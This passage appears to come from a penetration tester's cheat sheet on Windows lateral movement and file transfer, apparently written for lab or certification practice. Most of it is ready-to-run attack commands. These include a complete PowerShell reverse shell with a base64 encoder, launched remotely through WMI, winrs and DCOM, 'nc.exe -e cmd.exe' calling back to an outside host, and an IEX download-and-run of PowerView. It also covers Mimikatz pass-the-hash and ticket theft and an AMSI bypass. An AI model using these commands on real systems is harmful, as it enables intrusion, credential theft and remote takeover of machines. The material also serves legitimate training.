>C:\Users\jeff>wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
>```

>[!code]- Spawn a remote process with PowerShell WMI
>Launch the calculator app on 192.168.50.73 as jen:
>```powershell
>$username = 'jen';
>$password = 'Nexus123!';
>$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
>$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
>
>$options = New-CimSessionOption -Protocol DCOM
>$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options 
>$command = 'calc';
>
>Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
>```

>[!code]- Spawn a reverse shell with PowerShell WMI
>Encode the reverse shell:
>- Send the reverse shell to 192.168.118.2 (Kali)
>
>>[!code]- encode.py
>>```python
>>import sys
>>import base64
>>
>>payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
>>
>>cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
>>
>>print(cmd)
>>```
>
>Execute the encoding script:
>```bash
>kali@kali:~$ python3 encode.py
>```
>Execute the following commands to execute the reverse shell on the remote machine as jen:
>```powershell
>$username = 'jen';
>$password = 'Nexus123!';
>$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
>$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
>
>$options = New-CimSessionOption -Protocol DCOM
>$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options 
>$command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';
>
>Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
>```
>Setup a listener on Kali:
>```bash
>kali@kali:~$ nc -lnvp 443
>```
#### psexec.exe

>[!warning] Requires - (1) Username and hash/password for user with Administrator membership on remote machine (2) ADMIN$ share available (it is by default) (3) File and Printer Sharing enabled (it is by default)

>[!code]- Using psexec.exe
>- Launch PsExec64.exe (comes as part of the sysinternalssuite)
>- **\\\\FILES04** to specify what machine to remote to
>- **-u** to specify which user the remote session will be associated with
>- **-p** to specify that user's password
>```powershell
>PS C:\Tools\SysinternalsSuite> ./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
>```
#### impacket-wmiexec/psexec

>[!warning] Requires - (1) Username and hash/password for user with Administrator membership on remote machine (2) ADMIN$ share available (it is by default) (3) File and Printer Sharing enabled (it is by default)

>[!warning]- Limitation - The [2014 security update](https://support.microsoft.com/en-us/help/2871997/microsoft-security-advisory-update-to-improve-credentials-protection-a) prevented this technique from being used to authenticate as an account in the local Administrators group (apart from the built-in Administrator account).

>[!code]- Using impacket-wmiexec
>With a hash:
>```powershell
>kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
>```
>With a password:
>```powershell
>kali@kali:~$ /usr/bin/impacket-wmiexec Administator@192.168.50.73
>```

>[!code]- Using impacket-psexec
>With a password:
>- Obtain the shell as the user john on machine 10.10.10.1
>```bash
>kali@kali:~$ /usr/bin/impacket-psexec corp.local/john:password123@10.10.10.1
>```
>
>With a hash:
>- Zeros for the LM part of the hash, the other part is the NTLM hash
>```bash
>kali@kali:~$ /usr/bin/impacket-psexec -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 Administrator@192.168.1.105
>```
#### WinRM (winrs.exe / PS remoting)

>[!warning]- Requires - credentials for a user with Administrators or Remote Management Users membership on remote machine

>[!code]- Via winrs.exe
>- **-r** to specify the target machine
>- **-u** and **-p** to specify the username and password of the user to execute the command
>
>Execute a simple command:
>```powershell
>C:\Users\jeff>winrs -r:files04 -u:jen -p:Nexus123! "cmd /c hostname & whoami"
>```
>
>Execute a reverse shell (using the encoded payload as in the WMI section):
>```powershell
>C:\Users\jeff>winrs -r:files04 -u:jen -p:Nexus123! "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAF MAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD... HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
>```

>[!code]- Via PowerShell remoting
>```powershell
>PS C:\Users\jeff> $username = 'jen';  
>PS C:\Users\jeff> $password = 'Nexus123!';  
>PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;  
>PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
>PS C:\Users\jeff> New-PSSession -ComputerName 192.168.50.73 -Credential $credential
>PS C:\Users\jeff> Enter-PSSession 1
>```
#### Evil-WinRM

>[!warning]- Limitation - (1) password/hash for user with Administrators membership on remote machine and (2) winrm must be enabled on the remote host (is port 5895 or 5896 open?)

>[!code]- Use evil-winrm
>With a password:
>```bash
>kali@kali:~$ evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
>```
>With a NTLM hash:
>```bash
>kali@kali:~$ evil-winrm -i 192.168.50.220 -u daveadmin -H "32196B56FFE6F45E294117B91A83BF38!"
>```
>Load a script into memory while logging in:
>(Might need to bypass AMSI - more information [here](https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/)).
>```bash
>evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -s /opt/privsc/powershell
>Bypass-4MSI
>Invoke-Mimikatz.ps1
>Invoke-Mimikatz
>```
#### RDP

>[!code]- Using xfreerdp
>Using a password:
>```bash
>kali@kali:~$ xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
>```
>Using a hash:
>```bash
>kali@kali:~$ xfreerdp /u:rdp_admin /pth:8846f7eaee8fb117ad06bdd830b7586c /v:127.0.0.1:9833
>```
#### Overpass the hash

>[!warning]- Requires - a hash & username

>[!exploit]- Exploit - NTLM hash -> TGT

>[!code]- Use Mimikatz to obtain a TGT, then use PsExec to obtain a remote session
>- **/user** to specify the user to obtain a TGT for
>- **/domain** to specify which domain the TGT should be valid for
>- **/ntlm** to specify the NTLM hash of the /user
>- **/run** to specify the process to create (eg. PowerShell)
>```powershell
>mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
>```
>(For example) then run PsExec in the generated PowerShell process:
>```powershell
>PS C:\Windows\system32> cd C:\tools\SysinternalsSuite\
>PS C:\tools\SysinternalsSuite> .\PsExec.exe \\files04 cmd
>```
#### Pass the Ticket

>[!warning]- Requires - a cached TGS

>[!exploit]- Exploit - Cached TGS -> access resource as another user

>[!code]- Obtain a cached TGS in the LSASS memory
>Find and export any tickets:
>```powershell
>mimikatz # privilege::debug
>mimikatz # sekurlsa::tickets /export
>```
>Review the exported tickets:
>```powershell
>PS C:\Tools> dir *.kirbi
>```

>[!code]- Inject a TGS into memory with Mimikatz
>Inject a ticket for dave:
>```powershell
>mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
>```
>Confirm the ticket is in memory:
>```powershell
>PS C:\Tools> klist
>```

>[!code]- Access a domain as the user linked to the injected TGS
>We can now access the backup folder:
>```powershell
>PS C:\Tools> ls \\web04\backup
>```
>Whereas before we couldn't:
>```powershell
>PS C:\Windows\system32> whoami
>corp\jen
>PS C:\Windows\system32> ls \\web04\backup
>ls : Access to the path '\\web04\backup' is denied.
>```
#### DCOM (Distributed Component Object Model)

>[!warning] Requires - Administrator privileges on the local machine.

>[!exploit]- Exploit - Use the Component Object Model to initiate a reverse shell

>[!code]- Initiate a process using the COM
>- **192.168.50.73** is the remote machine
>
Spawn the calculator app on the remote machine:
>```powershell
>$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
>\$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
>```
>
>Spawn a reverse shell on the remote machine:
>```powershell
>\$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
>```
>Setup a listener on Kali:
>```bash
>kali@kali:~$ nc -lnvp 443
>```
#### Runas

>[!code]- Via the command line
>###### [Invoke-RunasCs](https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1)
>```powershell
>Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "nc.exe -e cmd.exe 192.168.45.201 80"
>```
>###### Runas (using saved credentials)
>```powershell
>runas /savecred /user:admin C:\PrivEsc\reverse.exe
>```

>[!code]- Via the GUI
>###### Runas
>- **/user** to specify the username of the user
>  - **cmd** to start cmd shell
>```powershell
PS C:\Users\steve> runas /user:backupadmin cmd  
>```
## Transfer Files

>[!code] (Linux → Windows) Download and inject a .ps1 into memory
>###### Inject PowerView into memory
>```powershell
>IEX(New-Object Net.WebClient).downloadString('http://192.168.45.219/PowerView.ps1')
>```

>[!code]- (Linux ↔ Windows) impacket-smbserver
>###### Windows -> Kali
>
>```powershell
># On Kali
>impacket-smbserver -smb2support -username df -password df share .
>
># On victim
>```
>
>
>```powershell
>net use \\10.10.14.6\share /u:df df
>
>copy file.zip \\10.10.14.4\share\
>
>net use /d \\10.10.14.6\share   # delete the share
>```
>
>###### Kali -> Windows
>```powershell
># On Kali (in folder to share)
>smbserver.py -username df -password df share . -smb2support
>
># On Windows
>net use \\10.10.14.30\share /u:df df
>cd \\10.10.14.30\share\
>```

>[!code]- (Linux ↔ Windows) evil-winrm
>###### Upload
>```powershell
>upload /relative/path/from/working/directory/file.txt [/destination/path/file.txt ]
>```
>###### Download
>```powershell
>download /full/path/file.txt /full/path/destination/file.txt
>```

>[!code]- (Linux ↔ Windows) SCP (SSH)
>###### Linux → Windows
>```powershell
>scp ./PsExec64.exe ariah@192.168.179.99:C:/Users/ariah/Downloads/psexec.exe
>```

>[!code]- (Linux ↔ Windows) Base64 Encoding/Decoding
>###### Encode a file
>```powershell
>[Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\full\path\to\your\file"))
>```
## Miscellaneous

>[!code]- Fix clock skew error
>```powershell
>sudo rdate -n 10.10.10.175
>sudo ntpdate 10.10.10.175
>```

>[!code]- PowerShell encoded reverse shell
>On Kali:
>```powershell
>pwsh
>
>$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out- String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Leng th);$stream.Flush()};$client.Close()'
>
>$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
>
>$EncodedText =[Convert]::ToBase64String($Bytes)
>
>$EncodedText
>
># returns:
>JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAzACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AIABTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAIAB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
>```


